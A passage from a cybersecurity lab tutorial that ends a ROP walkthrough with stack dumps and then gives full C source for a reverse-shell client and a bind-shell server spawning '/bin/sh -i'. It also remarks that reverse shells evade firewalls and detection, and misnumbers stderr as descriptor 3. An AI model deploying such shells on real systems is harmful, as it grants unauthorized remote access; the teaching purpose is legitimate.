    0xffffd6d0 ec d6 ff ff 39 d9 ff ff 01 00 00 00 38 d9 ff f7 ....9.......8...
    0xffffd6e0 00 00 00 00 00 00 00 00 00 00 00 00 41 41 41 41 ............AAAA
    0xffffd6f0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd700 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd710 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd720 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd730 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd740 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd750 41 41 41 41 41 41 41 41 00 00 00 00 42 42 42 42 AAAAAAAA....BBBB
                            esp
    0xffffd760 a6 85 04 08 [ef be ad de] 9c 84 04 08 99 84 04 08 ................
    0xffffd770 be ba fe ca 0d f0 ad 0b 4d 84 04 08 00 ca e3 f7 .... .. M.......
    0xffffd780 02 00 00 00 14 d8 ff ff 20 d8 ff ff 6a ae fe f7 ........ ...j...
    0xffffd790 02 00 00 00 14 d8 ff ff b4 d7 ff ff 18 a0 04 08 ................
    0xffffd7a0 2c 82 04 08 00 00 fd f7 00 00 00 00 00 00 00 00 ,...............
    0xffffd7b0 00 00 00 00 c3 b1 4c c6 d3 d5 76 fe 00 00 00 00 ......L...v.....
    0xffffd7c0 00 00 00 00 00 00 00 00 02 00 00 00 50 83 04 08 ............P...</code></pre>
    <p>After executing the first instruction (<code>0x080485a6 _fini+18 pop    %ebx</code>), the stack looks like:</p>
    <pre><code>─── Memory ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    0xffffd6d0 ec d6 ff ff 39 d9 ff ff 01 00 00 00 38 d9 ff f7 ....9.......8...
    0xffffd6e0 00 00 00 00 00 00 00 00 00 00 00 00 41 41 41 41 ............AAAA
    0xffffd6f0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd700 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd710 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd720 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd730 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd740 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd750 41 41 41 41 41 41 41 41 00 00 00 00 42 42 42 42 AAAAAAAA....BBBB
                                        esp
    0xffffd760 a6 85 04 08 ef be ad de [9c 84 04 08] 99 84 04 08 ................
    0xffffd770 be ba fe ca 0d f0 ad 0b 4d 84 04 08 00 ca e3 f7 .... .. M.......
    0xffffd780 02 00 00 00 14 d8 ff ff 20 d8 ff ff 6a ae fe f7 ........ ...j...
    0xffffd790 02 00 00 00 14 d8 ff ff b4 d7 ff ff 18 a0 04 08 ................
    0xffffd7a0 2c 82 04 08 00 00 fd f7 00 00 00 00 00 00 00 00 ,...............
    0xffffd7b0 00 00 00 00 c3 b1 4c c6 d3 d5 76 fe 00 00 00 00 ......L...v.....
    0xffffd7c0 00 00 00 00 00 00 00 00 02 00 00 00 50 83 04 08 ............P...</code></pre>
    <p>The stack pointer <code>esp</code> now points to the address of <code>add_sh</code>. With this setup, the next instruction (<code>0x080485a7 _fini+19 ret</code>) will in fact make the instruction pointer <code>eip</code> point to the address of <code>add_sh</code>. The flow of the stack continues similarly, with return addresses pointing to sections in the code that “adjust the stack offset” so that the flow goes as desired.</p>
    <p>### Resources</p>
    <ul>
    <li>[1] M. Hicks (2014), <em>Software Security</em>, Coursera, Cybersecurity Specialization, University of Maryland, College Park, <a href="https://www.coursera.org/learn/software-security" class="uri">https://www.coursera.org/learn/software-security</a>.</li>
    <li>[2] Hovav Shacham (2007), <em>The geometry of innocent flesh on the bone: return-into-libc without function calls (on the x86)</em>. In Proceedings of the 14th ACM conference on Computer and communications security (CCS ’07). ACM, New York, NY, USA, 552-561. DOI: https://doi.org/10.1145/1315245.1315313</li>
    <li>[3] Alex Reece (2013). <em>Introduction to return oriented programming (ROP)</em>. Retrieved from http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html.</li>
    <li>[4] Georgia Tech (2016). <em>CS 6265: Information Security Lab. Schedule</em>. Retrieved from https://tc.gtisc.gatech.edu/cs6265/2016/cal.html</li>
    <li>[5] Georgia Tech (2017). <em>CS 6265: Information Security Lab. Schedule</em>. Retrieved from https://tc.gtisc.gatech.edu/cs6265/2017/cal.html</li>
    <li>[6] Georgia Tech (2017). <em>CS 6265: Information Security Lab. Lec07: Return-oriented Programming</em>. Retrieved from https://tc.gtisc.gatech.edu/cs6265/2016/l/lab07-rop/README-tut.txt</li>
    <li>[7] Standford. <em>64-bit Linux Return-Oriented Programming</em>. Retrieved from https://crypto.stanford.edu/~blynn/rop/</li>
    <li>[8] slimm609. <em>checksec.sh</em>. Retrieved from https://github.com/slimm609/checksec.sh</li>
    <li>[9] Ketan Singh (2017), <em>Introduction to Return Oriented Programming (ROP)</em>. Retreived from https://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/.</li>
    <li>[10] Stack Overflow. <em>Managing inputs for payload injection?</em>. Retrieved from https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa.</li>
    <li>[11] Long Le. <em>Python Exploit Development Assistance for GDB (PEDA)</em>. Retreived from https://github.com/longld/peda.</li>
    <li>[12] Axel Souchet. <em>rp++</em>. Retrieved from https://github.com/0vercl0k/rp.</li>
    </ul>
    <h2 id="remote-shell">Remote shell</h2>
    <p>From a security point of view, a remote shell is usually part of a shellcode to enable unauthorized remote access to a system. This tutorial is heavily based in [1], [2], [3] and [4].</p>
    <hr />
    <p><strong>Note</strong>: as in previous tutorials, there’s a docker container that facilitates reproducing the work of this tutorial. The container can be built with:</p>
    <div class="sourceCode" id="cb218"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb218-1"><a href="#cb218-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> basic_cybersecurity6:latest .</span></code></pre></div>
    <p>and runned with:</p>
    <div class="sourceCode" id="cb219"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb219-1"><a href="#cb219-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">-it</span> basic_cybersecurity6:latest</span></code></pre></div>
    <hr />
    <p>The content used for this tutorial will be touching into remote shells.</p>
    <p>According to [1], there are basically two ways to get remote shell access:</p>
    <ul>
    <li><strong>Direct Remote Shells</strong>. A direct remote shell behaves as a server. It works like a ssh or telnet server. The remote user/attacker, connects to a specific port on the target machine and gets automatically access to a shell.</li>
    <li><strong>Reverse Remote Shells</strong>. These ones work the other way around. The application running on the target machine connects back (calls back home) to a specific server and port on a machine that belongs to the user/attacker.</li>
    </ul>
    <p>The <em>Reverse Shell</em> method has some advantages:</p>
    <ul>
    <li>Firewalls usually block incoming connections, but they allow outgoing connection in order to provide Internet access to the machine’s users.</li>
    <li>The user/attacker does not need to know the IP of the machine running the remote shell, but s/he needs to own a system with a fixed IP, to let the target machine call home.</li>
    <li>Usually there are many outgoing connections in a machine and only a few servers (if any) running on it. This makes detection a little bit harder, specially if the shell connects back to something listening on port 80…</li>
    </ul>
    <p>Let’s write a client and a server that will allow us to explore both methods:</p>
    <h3 id="the-client">The client</h3>
    <div class="sourceCode" id="cb220"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb220-1"><a href="#cb220-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
    <span id="cb220-2"><a href="#cb220-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span><span class="pp">  </span></span>
    <span id="cb220-3"><a href="#cb220-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
    <span id="cb220-4"><a href="#cb220-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/socket.h&gt;</span></span>
    <span id="cb220-5"><a href="#cb220-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;arpa/inet.h&gt;</span></span>
    <span id="cb220-6"><a href="#cb220-6" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb220-7"><a href="#cb220-7" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span></span>
    <span id="cb220-8"><a href="#cb220-8" aria-hidden="true" tabindex="-1"></a>client_init <span class="op">(</span><span class="dt">char</span> <span class="op">*</span>ip<span class="op">,</span> <span class="dt">int</span> port<span class="op">)</span></span>
    <span id="cb220-9"><a href="#cb220-9" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb220-10"><a href="#cb220-10" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span>                s<span class="op">;</span></span>
    <span id="cb220-11"><a href="#cb220-11" aria-hidden="true" tabindex="-1"></a>  <span class="kw">struct</span> sockaddr_in serv<span class="op">;</span></span>
    <span id="cb220-12"><a href="#cb220-12" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb220-13"><a href="#cb220-13" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">((</span>s <span class="op">=</span> socket <span class="op">(</span>AF_INET<span class="op">,</span> SOCK_STREAM<span class="op">,</span> <span class="dv">0</span><span class="op">))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb220-14"><a href="#cb220-14" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
    <span id="cb220-15"><a href="#cb220-15" aria-hidden="true" tabindex="-1"></a>      perror <span class="op">(</span><span class="st">&quot;socket:&quot;</span><span class="op">);</span></span>
    <span id="cb220-16"><a href="#cb220-16" aria-hidden="true" tabindex="-1"></a>      exit <span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
    <span id="cb220-17"><a href="#cb220-17" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
    <span id="cb220-18"><a href="#cb220-18" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb220-19"><a href="#cb220-19" aria-hidden="true" tabindex="-1"></a>  serv<span class="op">.</span>sin_family <span class="op">=</span> AF_INET<span class="op">;</span></span>
    <span id="cb220-20"><a href="#cb220-20" aria-hidden="true" tabindex="-1"></a>  serv<span class="op">.</span>sin_port <span class="op">=</span> htons<span class="op">(</span>port<span class="op">);</span></span>
    <span id="cb220-21"><a href="#cb220-21" aria-hidden="true" tabindex="-1"></a>  serv<span class="op">.</span>sin_addr<span class="op">.</span>s_addr <span class="op">=</span> inet_addr<span class="op">(</span>ip<span class="op">);</span></span>
    <span id="cb220-22"><a href="#cb220-22" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb220-23"><a href="#cb220-23" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>connect <span class="op">(</span>s<span class="op">,</span> <span class="op">(</span><span class="kw">struct</span> sockaddr <span class="op">*)</span> <span class="op">&amp;</span>serv<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span>serv<span class="op">))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb220-24"><a href="#cb220-24" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
    <span id="cb220-25"><a href="#cb220-25" aria-hidden="true" tabindex="-1"></a>      perror<span class="op">(</span><span class="st">&quot;connect:&quot;</span><span class="op">);</span></span>
    <span id="cb220-26"><a href="#cb220-26" aria-hidden="true" tabindex="-1"></a>      exit <span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
    <span id="cb220-27"><a href="#cb220-27" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
    <span id="cb220-28"><a href="#cb220-28" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb220-29"><a href="#cb220-29" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> s<span class="op">;</span></span>
    <span id="cb220-30"><a href="#cb220-30" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>The function receives as parameters an IP address to connect to and a port. Then it creates a TCP socket (SOCK_STREAM) and fills in the data for connecting. The connection is effectively established after a successful execution of connect. In case of any error (creating the socket or connection) we just stop the application.</p>
    <p>This function will allow us to implement a reverse remote shell. Client continues as:</p>
    <div class="sourceCode" id="cb221"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb221-1"><a href="#cb221-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span></span>
    <span id="cb221-2"><a href="#cb221-2" aria-hidden="true" tabindex="-1"></a>start_shell <span class="op">(</span><span class="dt">int</span> s<span class="op">)</span></span>
    <span id="cb221-3"><a href="#cb221-3" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb221-4"><a href="#cb221-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> <span class="op">*</span>name<span class="op">[</span><span class="dv">3</span><span class="op">]</span> <span class="op">;</span></span>
    <span id="cb221-5"><a href="#cb221-5" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb221-6"><a href="#cb221-6" aria-hidden="true" tabindex="-1"></a>  dup2 <span class="op">(</span>s<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
    <span id="cb221-7"><a href="#cb221-7" aria-hidden="true" tabindex="-1"></a>  dup2 <span class="op">(</span>s<span class="op">,</span> <span class="dv">1</span><span class="op">);</span></span>
    <span id="cb221-8"><a href="#cb221-8" aria-hidden="true" tabindex="-1"></a>  dup2 <span class="op">(</span>s<span class="op">,</span> <span class="dv">2</span><span class="op">);</span></span>
    <span id="cb221-9"><a href="#cb221-9" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb221-10"><a href="#cb221-10" aria-hidden="true" tabindex="-1"></a>  name<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">=</span> <span class="st">&quot;/bin/sh&quot;</span><span class="op">;</span></span>
    <span id="cb221-11"><a href="#cb221-11" aria-hidden="true" tabindex="-1"></a>  name<span class="op">[</span><span class="dv">1</span><span class="op">]</span> <span class="op">=</span> <span class="st">&quot;-i&quot;</span><span class="op">;</span></span>
    <span id="cb221-12"><a href="#cb221-12" aria-hidden="true" tabindex="-1"></a>  name<span class="op">[</span><span class="dv">2</span><span class="op">]</span> <span class="op">=</span> NULL<span class="op">;</span></span>
    <span id="cb221-13"><a href="#cb221-13" aria-hidden="true" tabindex="-1"></a>  execv <span class="op">(</span>name<span class="op">[</span><span class="dv">0</span><span class="op">],</span> name <span class="op">);</span></span>
    <span id="cb221-14"><a href="#cb221-14" aria-hidden="true" tabindex="-1"></a>  exit <span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
    <span id="cb221-15"><a href="#cb221-15" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb221-16"><a href="#cb221-16" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb221-17"><a href="#cb221-17" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>the function <code>start_shell</code> is pretty simple. It makes use of two system calls dup2 and execv. The first one duplicates a given file descriptor. In this case, the three calls at the beginning of the function, assigns the file descriptor received as parameter to the Standard Input (file descriptor 0), Standard Output (file descriptor 1) and Standard Error (file descriptor 3).</p>
    <p>So, if the file descriptor we pass as a parameter is one of the sockets created with our previous client and server functions, we are effectively sending and receiving data through the network every time we write data to the console and we read data from stdin.</p>
    <p>Now we just execute a shell with the -i flag (interactive mode). The execv system call will substitute the current process (whose stdin,stdout and stderr are associated to a network connection) by the one passed as parameter.</p>
    <p>And finally, main, self-explanatory:</p>
    <div class="sourceCode" id="cb222"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb222-1"><a href="#cb222-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span></span>
    <span id="cb222-2"><a href="#cb222-2" aria-hidden="true" tabindex="-1"></a>main <span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span> <span class="op">*</span>argv<span class="op">[])</span></span>
    <span id="cb222-3"><a href="#cb222-3" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb222-4"><a href="#cb222-4" aria-hidden="true" tabindex="-1"></a>  <span class="co">/* </span><span class="al">FIXME</span><span class="co">: Check command-line arguments */</span></span>
    <span id="cb222-5"><a href="#cb222-5" aria-hidden="true" tabindex="-1"></a>  start_shell <span class="op">(</span>client_init <span class="op">(</span>argv<span class="op">[</span><span class="dv">1</span><span class="op">],</span> atoi<span class="op">(</span>argv<span class="op">[</span><span class="dv">2</span><span class="op">])));</span></span>
    <span id="cb222-6"><a href="#cb222-6" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb222-7"><a href="#cb222-7" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <h3 id="the-server">The server</h3>
    <div class="sourceCode" id="cb223"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb223-1"><a href="#cb223-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
    <span id="cb223-2"><a href="#cb223-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
    <span id="cb223-3"><a href="#cb223-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
    <span id="cb223-4"><a href="#cb223-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/socket.h&gt;</span></span>
    <span id="cb223-5"><a href="#cb223-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;arpa/inet.h&gt;</span></span>
    <span id="cb223-6"><a href="#cb223-6" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb223-7"><a href="#cb223-7" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span></span>
    <span id="cb223-8"><a href="#cb223-8" aria-hidden="true" tabindex="-1"></a>server_init <span class="op">(</span><span class="dt">int</span> port<span class="op">)</span></span>
    <span id="cb223-9"><a href="#cb223-9" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb223-10"><a href="#cb223-10" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span>                s<span class="op">,</span> s1<span class="op">;</span></span>
    <span id="cb223-11"><a href="#cb223-11" aria-hidden="true" tabindex="-1"></a>  socklen_t          clen<span class="op">;</span></span>
    <span id="cb223-12"><a href="#cb223-12" aria-hidden="true" tabindex="-1"></a>  <span class="kw">struct</span> sockaddr_in serv<span class="op">,</span> client<span class="op">;</span></span>
    <span id="cb223-13"><a href="#cb223-13" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb223-14"><a href="#cb223-14" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">((</span>s <span class="op">=</span> socket <span class="op">(</span>AF_INET<span class="op">,</span> SOCK_STREAM<span class="op">,</span> <span class="dv">0</span><span class="op">))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb223-15"><a href="#cb223-15" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
    <span id="cb223-16"><a href="#cb223-16" aria-hidden="true" tabindex="-1"></a>      perror <span class="op">(</span><span class="st">&quot;socket:&quot;</span><span class="op">);</span></span>
    <span id="cb223-17"><a href="#cb223-17" aria-hidden="true" tabindex="-1"></a>      exit <span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
    <span id="cb223-18"><a href="#cb223-18" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
    <span id="cb223-19"><a href="#cb223-19" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb223-20"><a href="#cb223-20" aria-hidden="true" tabindex="-1"></a>  serv<span class="op">.</span>sin_family <span class="op">=</span> AF_INET<span class="op">;</span></span>
    <span id="cb223-21"><a href="#cb223-21" aria-hidden="true" tabindex="-1"></a>  serv<span class="op">.</span>sin_port <span class="op">=</span> htons<span class="op">(</span>port<span class="op">);</span></span>
    <span id="cb223-22"><a href="#cb223-22" aria-hidden="true" tabindex="-1"></a>  serv<span class="op">.</span>sin_addr<span class="op">.</span>s_addr <span class="op">=</span> htonl<span class="op">(</span>INADDR_ANY<span class="op">);</span></span>
    <span id="cb223-23"><a href="#cb223-23" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb223-24"><a href="#cb223-24" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">((</span>bind <span class="op">(</span>s<span class="op">,</span> <span class="op">(</span><span class="kw">struct</span> sockaddr <span class="op">*)&amp;</span>serv<span class="op">,</span></span>
    <span id="cb223-25"><a href="#cb223-25" aria-hidden="true" tabindex="-1"></a>         <span class="kw">sizeof</span><span class="op">(</span><span class="kw">struct</span> sockaddr_in<span class="op">)))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb223-26"><a href="#cb223-26" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
    <span id="cb223-27"><a href="#cb223-27" aria-hidden="true" tabindex="-1"></a>      perror <span class="op">(</span><span class="st">&quot;bind:&quot;</span><span class="op">);</span></span>
    <span id="cb223-28"><a href="#cb223-28" aria-hidden="true" tabindex="-1"></a>      exit <span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
    <span id="cb223-29"><a href="#cb223-29" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
    <span id="cb223-30"><a href="#cb223-30" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">((</span>listen <span class="op">(</span>s<span class="op">,</span> <span class="dv">10</span><span class="op">))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb223-31"><a href="#cb223-31" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
    <span id="cb223-32"><a href="#cb223-32" aria-hidden="true" tabindex="-1"></a>      perror <span class="op">(</span><span class="st">&quot;listen:&quot;</span><span class="op">);</span></span>
    <span id="cb223-33"><a href="#cb223-33" aria-hidden="true" tabindex="-1"></a>      exit <span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
    <span id="cb223-34"><a href="#cb223-34" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
    <span id="cb223-35"><a href="#cb223-35" aria-hidden="true" tabindex="-1"></a>  clen <span class="op">=</span> <span class="kw">sizeof</span><span class="op">(</span><span class="kw">struct</span> sockaddr_in<span class="op">);</span></span>
    <span id="cb223-36"><a href="#cb223-36" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">((</span>s1 <span class="op">=</span> accept <span class="op">(</span>s<span class="op">,</span> <span class="op">(</span><span class="kw">struct</span> sockaddr <span class="op">*)</span> <span class="op">&amp;</span>client<span class="op">,</span></span>
    <span id="cb223-37"><a href="#cb223-37" aria-hidden="true" tabindex="-1"></a>            <span class="op">&amp;</span>clen<span class="op">))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb223-38"><a href="#cb223-38" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
    <span id="cb223-39"><a href="#cb223-39" aria-hidden="true" tabindex="-1"></a>      perror <span class="op">(</span><span class="st">&quot;accept:&quot;</span><span class="op">);</span></span>
    <span id="cb223-40"><a href="#cb223-40" aria-hidden="true" tabindex="-1"></a>      exit <span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
    <span id="cb223-41"><a href="#cb223-41" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
    <span id="cb223-42"><a href="#cb223-42" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb223-43"><a href="#cb223-43" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> s1<span class="op">;</span></span>
    <span id="cb223-44"><a href="#cb223-44" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb223-45"><a href="#cb223-45" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>the beginning of the function is practically the same that for the client code. It creates a socket, fills in the network data, but instead of trying to connect to a remote server, it binds the socket to a specific port. Note that the address passed to bind is the constant INADDR_ANY. This is actually IP 0.0.0.0 and it means that the socket will be listening on all interfaces.</p>
    <p>The bind system call does not really make the socket a listening socket (you can actually call bind on a client socket). It is the listen system call the one that makes the socket a server socket. The second parameter passed to listen is the backlog. Basically it indicates how many connections will be queued to be accepted before the server starts rejecting connections. In our case it just do not really matter.</p>
    <p>At this point, our server is setup and we can accept connections. The call to the accept system call will make our server wait for an incoming connection. Whenever it arrives a new socket will be created to interchange data with the new client.</p>
    <p>Similar to the client, we also include <code>start_shell</code> and <code>main</code> as follows:</p>
    <div class="sourceCode" id="cb224"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb224-1"><a href="#cb224-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span></span>
    <span id="cb224-2"><a href="#cb224-2" aria-hidden="true" tabindex="-1"></a>start_shell <span class="op">(</span><span class="dt">int</span> s<span class="op">)</span></span>
    <span id="cb224-3"><a href="#cb224-3" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb224-4"><a href="#cb224-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> <span class="op">*</span>name<span class="op">[</span><span class="dv">3</span><span class="op">]</span> <span class="op">;</span></span>
    <span id="cb224-5"><a href="#cb224-5" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb224-6"><a href="#cb224-6" aria-hidden="true" tabindex="-1"></a>  dup2 <span class="op">(</span>s<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
    <span id="cb224-7"><a href="#cb224-7" aria-hidden="true" tabindex="-1"></a>  dup2 <span class="op">(</span>s<span class="op">,</span> <span class="dv">1</span><span class="op">);</span></span>
    <span id="cb224-8"><a href="#cb224-8" aria-hidden="true" tabindex="-1"></a>  dup2 <span class="op">(</span>s<span class="op">,</span> <span class="dv">2</span><span class="op">);</span></span>
    <span id="cb224-9"><a href="#cb224-9" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb224-10"><a href="#cb224-10" aria-hidden="true" tabindex="-1"></a>  name<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">=</span> <span class="st">&quot;/bin/sh&quot;</span><span class="op">;</span></span>
    <span id="cb224-11"><a href="#cb224-11" aria-hidden="true" tabindex="-1"></a>  name<span class="op">[</span><span class="dv">1</span><span class="op">]</span> <span class="op">=</span> <span class="st">&quot;-i&quot;</span><span class="op">;</span></span>
    <span id="cb224-12"><a href="#cb224-12" aria-hidden="true" tabindex="-1"></a>  name<span class="op">[</span><span class="dv">2</span><span class="op">]</span> <span class="op">=</span> NULL<span class="op">;</span></span>
    <span id="cb224-13"><a href="#cb224-13" aria-hidden="true" tabindex="-1"></a>  execv <span class="op">(</span>name<span class="op">[</span><span class="dv">0</span><span class="op">],</span> name <span class="op">);</span></span>
    <span id="cb224-14"><a href="#cb224-14" aria-hidden="true" tabindex="-1"></a>  exit <span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
    <span id="cb224-15"><a href="#cb224-15" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb224-16"><a href="#cb224-16" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb224-17"><a href="#cb224-17" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb224-18"><a href="#cb224-18" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb224-19"><a href="#cb224-19" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span></span>
    <span id="cb224-20"><a href="#cb224-20" aria-hidden="true" tabindex="-1"></a>main <span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span> <span class="op">*</span>argv<span class="op">[])</span></span>
    <span id="cb224-21"><a href="#cb224-21" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb224-22"><a href="#cb224-22" aria-hidden="true" tabindex="-1"></a>  <span class="co">/* </span><span class="al">FIXME</span><span class="co">: Check command-line arguments */</span></span>
    <span id="cb224-23"><a href="#cb224-23" aria-hidden="true" tabindex="-1"></a>  start_shell <span class="op">(</span>server_init <span class="op">(</span>atoi<span class="op">(</span>argv<span class="op">[</span><span class="dv">1</span><span class="op">])));</span></span>
    <span id="cb224-24"><a href="#cb224-24" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb224-25"><a href="#cb224-25" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <h3 id="direct-remote-shell">Direct Remote Shell</h3>
    <div class="sourceCode" id="cb225"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb225-1"><a href="#cb225-1" aria-hidden="true" tabindex="-1"></a><span class="co"># terminal 1</span></span>
